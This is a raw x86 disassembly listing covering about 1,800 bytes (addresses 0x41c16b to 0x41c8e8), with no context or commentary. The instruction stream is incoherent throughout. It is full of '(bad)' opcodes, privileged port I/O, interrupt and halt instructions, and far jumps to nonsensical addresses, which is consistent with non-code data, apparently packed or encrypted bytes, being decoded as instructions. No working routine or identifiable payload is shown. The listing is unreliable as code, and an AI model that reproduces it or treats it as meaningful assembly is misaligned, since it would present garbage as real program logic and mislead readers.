  41c16b:	sbb    DWORD PTR [ecx],edx
  41c16d:	jbe    0x41c0f6
  41c16f:	clc    
  41c170:	fild   DWORD PTR [edx+eiz*2]
  41c173:	jno    0x41c10d
  41c175:	sbb    eax,0xd77fa879
  41c17a:	mov    bh,0xbb
  41c17c:	add    al,0x2c
  41c17e:	out    dx,eax
  41c17f:	out    0xc,eax
  41c181:	dec    ebx
  41c182:	cmp    ah,BYTE PTR [edi-0x400ffc7f]
  41c188:	push   ss
  41c189:	pop    ebx
  41c18a:	push   eax
  41c18b:	jne    0x41c11e
  41c18d:	add    cl,ah
  41c18f:	sbb    ecx,DWORD PTR [ebx-0x243e0d6c]
  41c195:	push   es
  41c196:	in     al,dx
  41c197:	pusha  
  41c198:	mov    ds:0xda5f402c,eax
  41c19d:	jbe    0x41c183
  41c19f:	or     dl,al
  41c1a1:	xchg   esp,eax
  41c1a2:	repz mov ebx,0x332764ff
  41c1a8:	add    cl,ah
  41c1aa:	mov    ds:0x6954521a,eax
  41c1af:	inc    ebp
  41c1b0:	mov    bl,0x4c
  41c1b2:	add    DWORD PTR [esi],esi
  41c1b4:	pushf  
  41c1b5:	fld    QWORD PTR [edi]
  41c1b7:	out    0xdd,eax
  41c1b9:	mov    esp,0xd5c4e412
  41c1be:	cdq    
  41c1bf:	shl    edi,cl
  41c1c1:	or     al,0x1
  41c1c3:	dec    eax
  41c1c4:	cmp    ch,bh
  41c1c6:	push   ebp
  41c1c7:	ins    DWORD PTR es:[edi],dx
  41c1c8:	mov    DWORD PTR [edi+0x54e337c7],esi
  41c1ce:	xor    al,0xc1
  41c1d0:	and    BYTE PTR [esi+0x612909bb],cl
  41c1d6:	fcomp  QWORD PTR [ebp+0x6c]
  41c1d9:	mov    ch,0x70
  41c1db:	add    al,0xb3
  41c1dd:	pop    ebp
  41c1de:	mov    es,WORD PTR [esp+eax*1]
  41c1e1:	scas   eax,DWORD PTR es:[edi]
  41c1e2:	mov    ah,0x31
  41c1e4:	jno    0x41c1a1
  41c1e6:	loopne 0x41c1f1
  41c1e8:	mov    ebp,0x71fbd949
  41c1ed:	sti    
  41c1ee:	dec    edi
  41c1ef:	fld    TBYTE PTR [edx]
  41c1f1:	iret   
  41c1f2:	jmp    0x41c17b
  41c1f4:	bound  ebx,QWORD PTR [ebx+0x2c]
  41c1f7:	xor    eax,0xf32b9fe6
  41c1fc:	cmc    
  41c1fd:	in     eax,dx
  41c1fe:	clc    
  41c1ff:	pop    ds
  41c200:	(bad)  
  41c201:	dec    esi
  41c202:	arpl   WORD PTR [ebp-0x69],sp
  41c205:	jo     0x41c211
  41c207:	dec    ebp
  41c208:	push   0x1f
  41c20a:	ins    BYTE PTR es:[edi],dx
  41c20b:	imul   ebp,DWORD PTR [esi+0x4d4b0640],0x7c
  41c212:	inc    eax
  41c213:	jnp    0x41c1e4
  41c215:	test   BYTE PTR [edi-0x44cc4172],ch
  41c21b:	add    BYTE PTR [eax],al
  41c21d:	popf   
  41c21e:	dec    esp
  41c21f:	push   ss
  41c220:	ror    BYTE PTR [esi],cl
  41c222:	les    edx,FWORD PTR [eax+0xe]
  41c225:	fdivr  QWORD PTR [eax]
  41c227:	mov    edx,0x15044d82
  41c22c:	pop    ds
  41c22d:	inc    eax
  41c22e:	dec    ecx
  41c22f:	dec    edx
  41c230:	jmp    0x12f9dce
  41c235:	or     DWORD PTR [edi],edi
  41c237:	repz xchg edi,eax
  41c239:	xchg   ebx,eax
  41c23a:	mov    WORD PTR [ecx+0x28d790f3],ss
  41c240:	push   ebx
  41c241:	sbb    BYTE PTR [ecx+edx*2],cl
  41c244:	scas   eax,DWORD PTR es:[edi]
  41c245:	mov    bh,0xce
  41c247:	imul   ebx,ebp,0xffffffc3
  41c24a:	(bad)  
  41c24b:	jae    0x41c2b0
  41c24d:	les    esi,FWORD PTR [ebx-0x5ab1e2d0]
  41c253:	fwait
  41c254:	popa   
  41c255:	or     DWORD PTR [esi-0x80],ebx
  41c258:	fcom   DWORD PTR [ebx]
  41c25a:	inc    eax
  41c25b:	ret    0x2dcf
  41c25e:	mov    ch,0xbf
  41c260:	sbb    BYTE PTR [ebx+ebx*4-0x4],0x13
  41c265:	xor    DWORD PTR [esp+edi*1-0x32939465],0x3ef44e6b
  41c270:	lea    eax,[ebx+edx*1]
  41c273:	scas   al,BYTE PTR es:[edi]
  41c274:	out    dx,eax
  41c275:	lock mov esp,0x31a8317a
  41c27b:	stos   DWORD PTR es:[edi],eax
  41c27c:	dec    eax
  41c27d:	push   ds
  41c27e:	sar    BYTE PTR [edx+0x66198411],0xfb
  41c285:	mov    ss,WORD PTR ds:0x478a0724
  41c28b:	call   0xda5d:0x5a9dabd2
  41c292:	push   esp
  41c293:	xor    eax,0x96dd410f
  41c298:	arpl   WORD PTR [edx-0x71],ax
  41c29b:	mov    ecx,0x8ac6d22d
  41c2a0:	dec    edx
  41c2a1:	shr    BYTE PTR [ebx+0x74],1
  41c2a4:	sbb    DWORD PTR [ebp-0xa],0x96eb7d08
  41c2ab:	cdq    
  41c2ac:	mov    cl,0x9e
  41c2ae:	es xchg ecx,eax
  41c2b0:	aaa    
  41c2b1:	sbb    BYTE PTR [edi],bl
  41c2b3:	cmovae esp,DWORD PTR [ebx-0x408918dc]
  41c2ba:	(bad)  
  41c2bb:	pop    edi
  41c2bc:	pop    ebx
  41c2bd:	mov    ebx,0x93f29dac
  41c2c2:	jl     0x41c244
  41c2c4:	(bad)  
  41c2c5:	sbb    dh,BYTE PTR [ebp+0x188e09ba]
  41c2cb:	fisubr WORD PTR [edx+0x5aae2b97]
  41c2d1:	stos   BYTE PTR es:[edi],al
  41c2d2:	mov    edx,edx
  41c2d4:	enter  0xc473,0x67
  41c2d8:	call   0x99cfc4d2
  41c2dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c2de:	push   ecx
  41c2df:	inc    ebx
  41c2e0:	jp     0x41c284
  41c2e2:	mov    ebx,0x9ffa451e
  41c2e7:	call   0x271a7741
  41c2ec:	jno    0x41c2e0
  41c2ee:	push   ds
  41c2ef:	xchg   esi,eax
  41c2f0:	jno    0x41c348
  41c2f2:	jb     0x41c35a
  41c2f4:	(bad)  
  41c2f5:	fist   DWORD PTR [edi]
  41c2f7:	xchg   edi,eax
  41c2f8:	xchg   esp,eax
  41c2f9:	cmp    DWORD PTR [ebx+0x2aa52c8e],esp
  41c2ff:	(bad)  
  41c300:	jmp    0x41c2ea
  41c302:	mov    ah,0xbd
  41c304:	test   ch,cl
  41c306:	jb     0x41c2ff
  41c308:	daa    
  41c309:	mov    eax,ds:0x4831086d
  41c30e:	inc    edi
  41c30f:	inc    ebx
  41c310:	jo     0x6e085930
  41c316:	adc    ebp,DWORD PTR [edi]
  41c318:	test   al,0x6f
  41c31a:	cs jecxz 0x41c2e5
  41c31d:	or     eax,0xdf3aea48
  41c322:	lods   al,BYTE PTR ds:[esi]
  41c323:	jmp    0x49879fb9
  41c328:	dec    esi
  41c329:	cmp    al,BYTE PTR [edx+0x59]
  41c32c:	lods   al,BYTE PTR ds:[esi]
  41c32d:	(bad)  
  41c32e:	mov    eax,ds:0xd9729e06
  41c333:	mov    cs,WORD PTR [ebp-0x816c5ad]
  41c339:	(bad)  
  41c33a:	es out dx,eax
  41c33c:	stos   DWORD PTR es:[edi],eax
  41c33d:	mov    ds:0xdbfc555d,eax
  41c342:	sbb    DWORD PTR [esi-0x42],ebp
  41c345:	cli    
  41c346:	or     BYTE PTR [edi],dl
  41c348:	out    0x27,al
  41c34a:	pushf  
  41c34b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c34c:	xor    al,0x3d
  41c34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c34f:	push   ss
  41c350:	mov    esi,0x48e4a75c
  41c355:	push   0x75d173a9
  41c35a:	outs   dx,DWORD PTR ds:[esi]
  41c35b:	(bad)  
  41c35c:	push   edx
  41c35d:	mov    al,ds:0xdf591ae0
  41c362:	jnp    0x41c2e8
  41c364:	jp     0x41c318
  41c366:	mov    DWORD PTR ss:[ebx+0x3b2b23ac],esi
  41c36d:	mov    ch,0xf9
  41c36f:	fabs   
  41c371:	jmp    0x41c375
  41c373:	in     eax,0x78
  41c375:	sub    al,0x18
  41c377:	xlat   BYTE PTR ds:[ebx]
  41c378:	mov    ds:0xe245793d,al
  41c37d:	aam    0xef
  41c37f:	into   
  41c380:	inc    esi
  41c381:	push   ebx
  41c382:	imul   eax,DWORD PTR [esi],0xffffffa8
  41c385:	push   0xffffffaf
  41c387:	push   edi
  41c388:	mov    ebp,0x2f4a2410
  41c38d:	ins    BYTE PTR es:[edi],dx
  41c38e:	sahf   
  41c38f:	(bad)  
  41c390:	enter  0xe0b3,0x36
  41c394:	push   ecx
  41c395:	push   eax
  41c396:	mov    ch,0xb4
  41c398:	mov    ah,0xb3
  41c39a:	or     ebx,DWORD PTR cs:[ebx-0x1e3a5bf8]
  41c3a1:	push   ebx
  41c3a2:	push   ss
  41c3a3:	add    DWORD PTR [edi],esi
  41c3a5:	lock cs xchg edi,eax
  41c3a8:	cmc    
  41c3a9:	sub    al,0x38
  41c3ab:	or     BYTE PTR [ecx],cl
  41c3ad:	stc    
  41c3ae:	pop    ebp
  41c3af:	cs jno 0x41c373
  41c3b2:	icebp  
  41c3b3:	xchg   esp,eax
  41c3b4:	fcomp  DWORD PTR [edx+ebx*2]
  41c3b7:	rcl    DWORD PTR [edi],0x8c
  41c3ba:	mov    edx,0xa67a6077
  41c3bf:	ins    DWORD PTR es:[edi],dx
  41c3c0:	out    dx,eax
  41c3c1:	sbb    eax,0xcd8c83ae
  41c3c6:	out    0xe7,al
  41c3c8:	int    0xcb
  41c3ca:	adc    ah,BYTE PTR [edi-0x5d45ad1]
  41c3d0:	adc    BYTE PTR es:[ebx+0x74a7a3cb],bh
  41c3d7:	icebp  
  41c3d8:	mov    dh,0x2f
  41c3da:	add    esp,DWORD PTR [ebx+0x1d70841b]
  41c3e0:	test   BYTE PTR [ecx+ebx*4+0x2d809442],dl
  41c3e7:	push   0xffffff89
  41c3e9:	cmp    BYTE PTR [edi+esi*8-0x18],0x61
  41c3ee:	mov    ecx,0xd211b951
  41c3f3:	sbb    bh,ch
  41c3f5:	mov    ds:0xc8a1bf0b,al
  41c3fa:	out    0x3d,al
  41c3fc:	in     eax,dx
  41c3fd:	(bad)  
  41c3fe:	fdiv   DWORD PTR [ebp+0x56bafeff]
  41c404:	add    eax,0xf4fc641a
  41c409:	test   al,0xb8
  41c40b:	inc    BYTE PTR [eax-0x4f]
  41c40e:	mov    al,0x72
  41c410:	(bad)  
  41c412:	jmp    0xba0e:0x98e761bf
  41c419:	adc    eax,0xfebae9d9
  41c41e:	das    
  41c41f:	cwde   
  41c420:	int3   
  41c421:	rol    DWORD PTR [ecx-0x7d8d1dcf],1
  41c427:	pop    ds
  41c428:	out    dx,eax
  41c429:	pushf  
  41c42a:	daa    
  41c42b:	pop    edi
  41c42c:	jae    0x41c3cc
  41c42e:	icebp  
  41c42f:	imul   edx,DWORD PTR [ebx-0x24],0x1d
  41c433:	inc    ebp
  41c434:	jb     0x41c4ad
  41c436:	(bad)  
  41c437:	and    DWORD PTR [esi-0x47d81447],esp
  41c43d:	outs   dx,BYTE PTR ds:[esi]
  41c43e:	icebp  
  41c43f:	mov    ebx,0x412ed158
  41c444:	sbb    bl,BYTE PTR [esi]
  41c446:	mov    ?,WORD PTR [esi-0x4a45ee2]
  41c44c:	jae    0x41c469
  41c44e:	rcr    BYTE PTR [eax],0x9
  41c451:	stos   BYTE PTR es:[edi],al
  41c452:	imul   esp,edx,0xdc280db4
  41c458:	test   DWORD PTR [ebp-0x26ac14bd],ecx
  41c45e:	ret    
  41c45f:	add    al,0x52
  41c461:	outs   dx,BYTE PTR ds:[esi]
  41c462:	scas   al,BYTE PTR es:[edi]
  41c463:	sbb    BYTE PTR [ebp+0x99dc477],ch
  41c469:	imul   eax,DWORD PTR [ecx-0x25],0x5f2c8901
  41c470:	int    0x62
  41c472:	mov    esi,0x70dd9966
  41c477:	retf   
  41c478:	mov    ds:0xd5107766,eax
  41c47d:	inc    BYTE PTR [edx-0x3d]
  41c480:	mov    BYTE PTR [ebp-0x64d23b4c],0xe2
  41c487:	fild   DWORD PTR [ecx]
  41c489:	adc    dh,BYTE PTR [esi+0x7]
  41c48c:	call   0x946:0x6c4c374f
  41c493:	dec    ebx
  41c494:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c495:	mov    al,0x0
  41c497:	mov    ecx,ebx
  41c499:	add    esp,DWORD PTR [edx*1+0x749958e2]
  41c4a0:	sub    dh,BYTE PTR ds:0xf8b2a60d
  41c4a6:	inc    ebx
  41c4a7:	push   esi
  41c4a8:	push   eax
  41c4a9:	inc    esp
  41c4aa:	shr    DWORD PTR [edi*1-0x16b02ca],cl
  41c4b1:	frstor [ebx]
  41c4b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b4:	xchg   esp,eax
  41c4b5:	pop    ecx
  41c4b6:	push   esp
  41c4b7:	jl     0x41c4d6
  41c4b9:	push   esp
  41c4ba:	dec    edx
  41c4bb:	xor    bh,BYTE PTR [edi-0x57]
  41c4be:	push   ss
  41c4bf:	sbb    al,0xd1
  41c4c1:	rol    ah,1
  41c4c3:	int    0x16
  41c4c5:	sbb    al,0x39
  41c4c7:	mov    ecx,0x52fd0cb7
  41c4cc:	mov    al,ds:0xefb32474
  41c4d1:	jmp    0xf6e5728e
  41c4d6:	cmp    ebp,DWORD PTR [edi]
  41c4d8:	inc    edi
  41c4d9:	popf   
  41c4da:	fcmove st,st(0)
  41c4dc:	dec    esi
  41c4dd:	pop    esp
  41c4de:	scas   eax,DWORD PTR es:[edi]
  41c4df:	lds    esi,FWORD PTR [ebx]
  41c4e1:	call   0xdc0295be
  41c4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e7:	test   eax,0x2c22d72f
  41c4ec:	jnp    0x41c4bc
  41c4ee:	pop    ebx
  41c4ef:	sar    BYTE PTR [edx],0x17
  41c4f2:	add    DWORD PTR [eax+0x2e],0x44
  41c4f6:	pop    ebx
  41c4f7:	je     0x41c47f
  41c4f9:	mov    bl,0xcf
  41c4fb:	mov    edx,0x21da39d6
  41c500:	(bad)  
  41c501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c502:	nop
  41c503:	stos   DWORD PTR es:[edi],eax
  41c504:	xchg   ebx,eax
  41c505:	aaa    
  41c506:	pop    edi
  41c507:	cmp    al,0xf7
  41c509:	push   0x24
  41c50b:	sbb    DWORD PTR [edx+0x7],esi
  41c50e:	jbe    0x41c492
  41c510:	sub    bl,BYTE PTR [ebp-0x3e]
  41c513:	xchg   BYTE PTR [ebx+eax*2-0x77],al
  41c517:	pop    ecx
  41c518:	test   esp,edi
  41c51a:	fadd   QWORD PTR [edx-0x22f762bb]
  41c520:	push   es
  41c521:	cld    
  41c522:	xor    edx,DWORD PTR [edx]
  41c524:	inc    esi
  41c525:	sub    al,0x3e
  41c527:	jno    0x41c536
  41c529:	jb     0x41c4fc
  41c52b:	leave  
  41c52c:	addr16 adc al,0x42
  41c52f:	jnp    0x41c532
  41c531:	xchg   ebx,eax
  41c532:	push   edx
  41c533:	push   ebx
  41c534:	sahf   
  41c535:	(bad)  
  41c536:	mov    dl,0x7d
  41c538:	mov    DWORD PTR [ecx+0x33fa620e],0xfbc70132
  41c542:	adc    cl,bh
  41c544:	fld    QWORD PTR [ecx+0x2c]
  41c547:	push   0xc
  41c549:	or     al,0x2b
  41c54b:	loopne 0x41c50f
  41c54d:	fnstcw WORD PTR [esi]
  41c54f:	mov    ds:0x1113edaf,eax
  41c554:	push   esp
  41c555:	outs   dx,BYTE PTR ds:[esi]
  41c556:	ds test eax,0x63e295d7
  41c55c:	(bad)  
  41c55d:	mov    al,ds:0x7467da55
  41c562:	sti    
  41c563:	xchg   DWORD PTR [eax+0x9],esi
  41c566:	mov    bl,0x4a
  41c568:	adc    dh,dh
  41c56a:	int    0xbc
  41c56c:	and    eax,DWORD PTR [ebx-0x2c]
  41c56f:	pop    edx
  41c570:	jg     0x41c546
  41c572:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c573:	ror    DWORD PTR [esi+0x1ca17456],1
  41c579:	sub    BYTE PTR [edx],dl
  41c57b:	retf   
  41c57c:	add    eax,0x9896e883
  41c581:	sub    ebp,ebx
  41c583:	push   cs
  41c584:	pusha  
  41c585:	inc    ebx
  41c586:	ds aam 0x6e
  41c589:	jp     0x41c52c
  41c58b:	shl    DWORD PTR [edx+0x67],0x25
  41c58f:	das    
  41c590:	or     ah,0x7e
  41c593:	or     eax,DWORD PTR gs:[ebp-0x16c5ab53]
  41c59a:	add    eax,0x48643fe6
  41c59f:	leave  
  41c5a0:	sbb    esp,DWORD PTR [edi+0x30cc4c18]
  41c5a6:	inc    ebx
  41c5a7:	dec    ebx
  41c5a8:	inc    edi
  41c5a9:	dec    ecx
  41c5aa:	jb     0x41c54d
  41c5ac:	push   esi
  41c5ad:	data16 mov WORD PTR [eax+0x28f95c24],ds
  41c5b4:	repnz in al,dx
  41c5b6:	mov    ah,0x36
  41c5b8:	in     al,0xcd
  41c5ba:	popa   
  41c5bb:	icebp  
  41c5bc:	js     0x41c5d7
  41c5be:	inc    eax
  41c5bf:	sti    
  41c5c0:	div    ecx
  41c5c2:	mov    bh,0x80
  41c5c4:	in     al,dx
  41c5c5:	gs pusha 
  41c5c7:	std    
  41c5c8:	(bad)  
  41c5c9:	jle    0x41c60d
  41c5cb:	jbe    0x41c606
  41c5cd:	fisttp WORD PTR [edx+0x68563c89]
  41c5d3:	add    eax,0x5fd490ff
  41c5d8:	inc    ebp
  41c5d9:	clc    
  41c5da:	clc    
  41c5db:	inc    ecx
  41c5dc:	lods   al,BYTE PTR ds:[esi]
  41c5dd:	sbb    al,BYTE PTR [esi+0x7d455c9f]
  41c5e3:	inc    edi
  41c5e4:	mov    ebp,0x4b0fa495
  41c5e9:	sahf   
  41c5ea:	rol    BYTE PTR [ecx-0x3b],cl
  41c5ed:	jmp    0xa664ed0a
  41c5f2:	cmp    DWORD PTR [ecx-0x15b34cfe],eax
  41c5f8:	pushf  
  41c5f9:	push   es
  41c5fa:	cmp    al,0xc
  41c5fc:	sub    DWORD PTR [ebx+0x11],edi
  41c5ff:	pop    ds
  41c600:	fdivr  st,st(0)
  41c602:	stc    
  41c603:	fidiv  DWORD PTR [edi+ebx*4]
  41c606:	sub    dl,BYTE PTR [edi-0x4f]
  41c609:	pop    ds
  41c60a:	add    eax,0xbc989899
  41c60f:	fadd   DWORD PTR [esi+0x2b2e52a]
  41c615:	xor    esp,DWORD PTR [ecx]
  41c617:	or     eax,0x9db106e2
  41c61c:	mov    esp,0x154314f9
  41c621:	and    al,0x71
  41c623:	push   edi
  41c624:	arpl   WORD PTR [ebp-0x7],di
  41c627:	mov    ch,0xe0
  41c629:	aas    
  41c62a:	adc    BYTE PTR [ebp+0x3b684ed0],0xc0
  41c631:	xchg   esp,eax
  41c632:	sub    DWORD PTR [eax+0x404fd025],0xe9c2a3c6
  41c63c:	bound  edi,QWORD PTR [eax-0x7b]
  41c63f:	(bad)  
  41c640:	jmp    0x50a49ece
  41c645:	mov    bh,0x75
  41c647:	xchg   esp,eax
  41c648:	daa    
  41c649:	push   0xa0b847ad
  41c64e:	in     al,0xa8
  41c650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c651:	fdivr  QWORD PTR [esi+0x13a3eadd]
  41c657:	pop    ebx
  41c658:	push   es
  41c659:	adc    eax,0x773941a8
  41c65e:	dec    edi
  41c65f:	cmp    al,0x7b
  41c661:	shr    DWORD PTR [esi],cl
  41c663:	rcr    DWORD PTR [ecx],0x99
  41c666:	bswap  edx
  41c668:	out    0x14,al
  41c66a:	dec    ecx
  41c66b:	pop    ebp
  41c66c:	retf   0x1fbf
  41c66f:	out    dx,al
  41c670:	mov    bl,0x77
  41c672:	mov    al,ds:0xae76abf1
  41c677:	add    al,BYTE PTR [esp+edx*4]
  41c67a:	or     BYTE PTR [ecx+edx*8],dh
  41c67d:	je     0x41c620
  41c67f:	test   BYTE PTR [edx-0x65],dl
  41c682:	mov    DWORD PTR [ebx],ebp
  41c684:	sbb    al,BYTE PTR [edx-0x39]
  41c687:	sar    DWORD PTR [eax+0x10],0xf8
  41c68b:	xor    eax,0xdf018912
  41c690:	into   
  41c691:	xchg   cl,bh
  41c693:	mov    WORD PTR es:[ecx+0x29],gs
  41c697:	dec    ebp
  41c698:	mov    edx,esi
  41c69a:	mov    al,ds:0xd4e82a4e
  41c69f:	sbb    DWORD PTR [edi+edi*2-0x995fb9f],ebx
  41c6a6:	jmp    0x41c6ad
  41c6a8:	sbb    al,0x92
  41c6aa:	mov    ecx,0x933c9b2a
  41c6af:	mov    ecx,gs
  41c6b1:	in     al,0x55
  41c6b3:	lahf   
  41c6b4:	pop    eax
  41c6b5:	test   bl,dh
  41c6b7:	sbb    bl,dl
  41c6b9:	push   esi
  41c6ba:	sti    
  41c6bb:	mov    ecx,0x8759dd8c
  41c6c0:	callw  0xb70a
  41c6c4:	fimul  WORD PTR [eax]
  41c6c6:	sub    dl,BYTE PTR [ebp+0x76]
  41c6c9:	inc    esi
  41c6ca:	mov    ds:0xa71091e7,al
  41c6cf:	loop   0x41c74b
  41c6d1:	stos   BYTE PTR es:[edi],al
  41c6d2:	inc    edx
  41c6d3:	outs   dx,DWORD PTR ds:[esi]
  41c6d4:	xchg   esp,eax
  41c6d5:	test   ecx,ebp
  41c6d7:	push   ebx
  41c6d8:	out    dx,al
  41c6d9:	jmp    0xd685:0x4ba2f418
  41c6e0:	push   ecx
  41c6e1:	sub    cl,BYTE PTR [ebx]
  41c6e3:	jmp    DWORD PTR [esi+eax*2-0x54]
  41c6e7:	pop    ecx
  41c6e8:	out    dx,al
  41c6e9:	mov    WORD PTR [esp+esi*8+0x7c],gs
  41c6ed:	lods   eax,DWORD PTR ds:[esi]
  41c6ee:	push   ds
  41c6ef:	sbb    al,BYTE PTR [esi+0x21ed2fc1]
  41c6f5:	lock stos DWORD PTR es:[edi],eax
  41c6f7:	stc    
  41c6f8:	jl     0x41c767
  41c6fa:	adc    cl,BYTE PTR [eax]
  41c6fc:	jmp    0x81f1c99a
  41c701:	or     ebp,ebp
  41c703:	aad    0xa
  41c705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c706:	ins    DWORD PTR es:[edi],dx
  41c707:	(bad)  
  41c708:	push   edx
  41c709:	inc    edx
  41c70a:	mov    dl,BYTE PTR ds:0x8a7a4dc7
  41c710:	adc    eax,0x6e5634f8
  41c715:	mov    bh,0x93
  41c717:	addr16 mov eax,0xe2e1c016
  41c71d:	retf   
  41c71e:	pop    ss
  41c71f:	push   ebp
  41c720:	sbb    DWORD PTR [ebp+0x18],ecx
  41c723:	(bad)  
  41c724:	(bad)  
  41c725:	pop    esi
  41c726:	add    ebx,esp
  41c728:	cli    
  41c729:	sbb    edx,DWORD PTR [ebx+0x2b]
  41c72c:	scas   al,BYTE PTR es:[edi]
  41c72d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c72f:	loope  0x41c71f
  41c731:	mov    eax,cs
  41c733:	fidivr DWORD PTR [eax]
  41c735:	mov    eax,0xc6df6fb1
  41c73a:	and    al,0x69
  41c73c:	call   0x707f:0x247ebcbf
  41c743:	andnps xmm1,XMMWORD PTR [eax-0x3882dfb3]
  41c74a:	jmp    0x7b76:0x3d136bb5
  41c751:	pop    edx
  41c752:	int3   
  41c753:	js     0x41c739
  41c755:	ret    0xa5b7
  41c758:	pop    ebx
  41c759:	aad    0x11
  41c75b:	mov    ebx,0x36b28358
  41c760:	or     DWORD PTR es:[ecx+0x507950c2],edx
  41c767:	jnp    0x41c74b
  41c769:	mov    ds:0x5b629a0f,al
  41c76e:	mov    BYTE PTR [esp+ecx*1-0x65],dh
  41c772:	leave  
  41c773:	fwait
  41c774:	jne    0x41c7c0
  41c776:	jg     0x41c7b6
  41c778:	gs sbb al,0x24
  41c77b:	aaa    
  41c77c:	lea    eax,[ecx]
  41c77e:	shl    BYTE PTR [edi],1
  41c780:	aam    0xe1
  41c782:	and    edi,edi
  41c784:	retf   0xfc5b
  41c787:	aad    0xcf
  41c789:	stc    
  41c78a:	mov    dh,0x69
  41c78c:	add    edx,eax
  41c78e:	sub    bh,BYTE PTR [edx]
  41c790:	cmc    
  41c791:	add    ecx,eax
  41c793:	add    ecx,DWORD PTR [ecx]
  41c795:	mov    ch,0xf0
  41c797:	jno    0x41c769
  41c799:	pop    edi
  41c79a:	stos   BYTE PTR es:[edi],al
  41c79b:	or     al,0xb5
  41c79d:	retf   0x6d08
  41c7a0:	dec    ebx
  41c7a1:	and    edx,DWORD PTR [ebx]
  41c7a3:	or     ebp,DWORD PTR [ebx+0x7fbf1d3a]
  41c7a9:	ja     0x41c785
  41c7ab:	mov    esi,0x35e81fde
  41c7b0:	push   esp
  41c7b1:	repnz dec ebp
  41c7b3:	loope  0x41c747
  41c7b5:	es retf 
  41c7b7:	imul   edi,ebx,0x14f036c3
  41c7bd:	mov    eax,0xc0d86983
  41c7c2:	mov    DWORD PTR [ecx],ebp
  41c7c4:	mov    bh,0xb0
  41c7c6:	cmp    esi,ebx
  41c7c8:	mov    ebx,0x42617da7
  41c7cd:	fld    QWORD PTR [esi-0x3a75f3e2]
  41c7d3:	out    0xf7,eax
  41c7d5:	int    0x11
  41c7d7:	cld    
  41c7d8:	mov    ebp,0x93412b64
  41c7dd:	sub    al,0xd0
  41c7df:	sub    eax,0x94b138a3
  41c7e4:	out    dx,eax
  41c7e5:	stos   BYTE PTR es:[edi],al
  41c7e6:	mov    ecx,0x2c6786cc
  41c7eb:	lea    ebp,[esp+eiz*4-0x38]
  41c7ef:	inc    ebp
  41c7f0:	je     0x41c862
  41c7f2:	ja     0x41c7a9
  41c7f4:	xor    DWORD PTR [ebx],edx
  41c7f6:	and    al,dh
  41c7f8:	xlat   BYTE PTR ds:[ebx]
  41c7f9:	jb     0x6863463b
  41c7ff:	xor    DWORD PTR [edi+0x18],eax
  41c802:	xchg   ebx,eax
  41c803:	mov    ds:0xbfe5ff49,eax
  41c808:	and    eax,0x728780c7
  41c80d:	adc    DWORD PTR [esi+edi*2+0x2c],0x8dfa78dd
  41c815:	xchg   edi,esp
  41c817:	mov    es,eax
  41c819:	sbb    DWORD PTR [eax],edi
  41c81b:	adc    BYTE PTR [esi-0x4bea76aa],bh
  41c821:	fsubr  DWORD PTR ds:0x85935aa9
  41c827:	popa   
  41c828:	repz adc BYTE PTR gs:[esi+eax*1],dh
  41c82d:	add    BYTE PTR [ebx+0x53],ch
  41c830:	mov    ebx,0xb8d4abb7
  41c835:	jmp    0x41c817
  41c837:	jnp    0x41c828
  41c839:	nop
  41c83a:	popf   
  41c83b:	add    cl,BYTE PTR [ecx+0x63]
  41c83e:	arpl   sp,bp
  41c840:	and    eax,0x44a87aec
  41c845:	mov    esi,0xf389bbc2
  41c84a:	leave  
  41c84b:	push   ecx
  41c84c:	pop    es
  41c84d:	out    dx,al
  41c84e:	cli    
  41c84f:	call   0xe033442e
  41c854:	cwde   
  41c855:	push   ss
  41c856:	pop    ss
  41c857:	add    DWORD PTR [ebx+0x72573884],ecx
  41c85d:	fsubr  st(7),st
  41c85f:	in     al,0xd7
  41c861:	test   edx,edx
  41c863:	dec    esi
  41c864:	sub    al,0x14
  41c866:	mov    eax,ds:0x9f04002e
  41c86b:	push   ebp
  41c86c:	shr    DWORD PTR [ebx],0xbb
  41c86f:	adc    DWORD PTR [esi-0x4b420681],ebx
  41c875:	out    dx,eax
  41c876:	sbb    eax,0x4abaeaad
  41c87b:	stc    
  41c87c:	push   ss
  41c87d:	mov    edx,0x37fb604f
  41c882:	je     0x41c8a2
  41c884:	mov    ah,0x60
  41c886:	int    0xf3
  41c888:	xlat   BYTE PTR ds:[ebx]
  41c889:	ret    0x11dc
  41c88c:	jb     0x41c834
  41c88e:	pop    eax
  41c88f:	sub    BYTE PTR [ebx-0x36],bh
  41c892:	mov    ch,0xbd
  41c894:	les    eax,FWORD PTR [eax-0x770fbf34]
  41c89a:	int3   
  41c89b:	push   edx
  41c89c:	push   0xf9b2397
  41c8a1:	and    esp,DWORD PTR [edx]
  41c8a3:	loop   0x41c8fb
  41c8a5:	cmp    esi,DWORD PTR ds:0xd2a8903b
  41c8ab:	clc    
  41c8ac:	fmul   DWORD PTR [edi+0x62]
  41c8af:	push   ebp
  41c8b0:	and    BYTE PTR [ebx],al
  41c8b2:	xchg   esp,eax
  41c8b3:	xor    BYTE PTR [ecx],cl
  41c8b5:	jp     0x41c911
  41c8b7:	xchg   edi,eax
  41c8b8:	stc    
  41c8b9:	hlt    
  41c8ba:	push   eax
  41c8bb:	stos   DWORD PTR es:[edi],eax
  41c8bc:	fnstcw WORD PTR [ebp+0x1074def2]
  41c8c2:	int3   
  41c8c3:	jle    0x41c8d9
  41c8c5:	leave  
  41c8c6:	xchg   edx,eax
  41c8c7:	enter  0xd959,0x47
  41c8cb:	xchg   edi,eax
  41c8cc:	ds inc ebp
  41c8ce:	mov    eax,0xe6c1f7c1
  41c8d3:	lahf   
  41c8d4:	jnp    0x41c8d0
  41c8d6:	jnp    0x41c8de
  41c8d8:	inc    ebp
  41c8d9:	stc    
  41c8da:	jo     0x41c8b8
  41c8dc:	mov    esi,0x51b45a8c
  41c8e1:	pop    esi
  41c8e2:	adc    eax,0xbd2287db
  41c8e7:	fwait
  41c8e8:	xlat   BYTE PTR ds:[ebx]
